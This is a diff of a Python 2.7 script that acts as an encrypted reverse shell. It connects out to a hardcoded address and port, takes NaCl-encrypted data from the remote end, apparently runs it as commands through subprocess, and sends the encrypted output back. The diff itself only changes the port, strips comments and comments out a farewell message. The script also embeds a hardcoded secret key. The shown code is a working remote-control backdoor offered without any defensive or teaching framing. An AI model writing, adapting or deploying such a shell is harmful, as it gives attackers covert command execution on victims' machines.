@@ -1,13 +1,11 @@
 #!/usr/bin/python2.7
 import nacl.secret
 import nacl.utils
-
 import socket,subprocess
 import sys,os
 
-
 HOST = '192.168.1.11'   # Symbolic name, meaning all available interfaces
-PORT = 8887 # Arbitrary non-privileged port
+PORT = 8888 # Arbitrary non-privileged port
 
 # This must be kept secret, this is the combination to your safe
 key = '9SeT2kaxYlRYS675TxzHwB2el4Pa15A3'
@@ -32,9 +30,6 @@ success = box.encrypt('Hello There!')
 s.send(success)
 #now keep talking with the client
 while 1:
-    #wait to accept a connection - blocking call
-    #conn, addr = s.accept()
-    #print 'Connected with ' + addr[0] + ':' + str(addr[1])
 
     data = s.recv(1024)
     dataDec =  box.decrypt(data)
@@ -45,5 +40,5 @@ while 1:
     stdoutputEnc = box.encrypt(stdoutput)
     s.send(stdoutputEnc)
 
-s.send(box.encrypt('bye now!'))
+#s.send(box.encrypt('bye now!'))
 s.close()
